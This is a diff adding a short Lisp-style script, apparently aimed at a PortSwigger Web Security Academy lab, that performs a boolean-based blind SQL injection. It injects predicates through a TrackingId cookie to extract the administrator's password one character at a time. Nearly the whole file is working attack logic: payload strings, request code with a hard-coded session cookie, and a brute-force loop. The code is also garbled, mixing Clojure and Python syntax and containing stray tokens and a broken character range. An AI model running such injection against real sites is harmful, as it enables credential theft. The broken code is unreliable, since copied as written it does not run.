@@ -1,0 +1,40 @@
+(require '[clojure.string :as str])
+(import socket
+        ssl
+        sys
+        requests)
+
+(map #(format "EXISTS (SELECT password FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1)='%s')"
+             (chr %))
+     (range (python/pow 2 7)))
+
+(defn eval-pred [p]
+  (boolean (re-find #".*Welcome.*" 
+                    (let [response (requests/get 
+                                    "https://0ab7007904962b48834455dc002200e7.web-security-academy.net/"
+                                    **
+                                    :headers {"Cookie" (str "TrackingId=KtgocCustmAMNIfQ' AND " p " --; session=1N10SH2nIsBGhQq7tU8sFEBhMlVOUBdK")
+                                              "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
+                                              "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"})]
+                      (def a 
+                        (.-text response))
+                      a))))
+
+(defn test [n c]
+  
+  (try 
+    (eval-pred (format "EXISTS (SELECT password FROM users WHERE username = 'administrator' AND SUBSTRING(password,%d,%d)='%s')"
+                       n
+                       1
+                       c))
+    (catch Exception e (def exc e) false)))
+
+(doseq [n (range 1 ##Inf)]
+
+  (->> (range (pow 33 126))
+       (pmap (comp (juxt identity (partial test n)) chr))
+       (filter second)
+       ffirst
+       println))
+;; Flushing
+(println)
